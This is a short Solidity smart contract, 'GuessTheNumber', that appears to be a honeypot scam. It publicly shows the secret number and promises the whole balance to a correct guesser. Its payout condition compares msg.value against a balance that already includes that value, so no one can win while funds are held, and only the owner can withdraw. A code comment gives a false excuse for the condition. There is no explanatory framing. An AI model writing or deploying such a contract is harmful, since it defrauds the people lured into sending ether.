pragma solidity ^0.4.17;
contract GuessTheNumber {

    address public Owner = msg.sender;
    uint public SecretNumber = 24;
   
    function() public payable {
    }
   
    function Withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Guess(uint n) public payable {
        if(msg.value &gt;= this.balance &amp;&amp; n == SecretNumber &amp;&amp; msg.value &gt;= 0.05 ether) {
            // Previous Guesses makes the number easier to guess so you have to pay more
            msg.sender.transfer(this.balance+msg.value);
        }
    }
}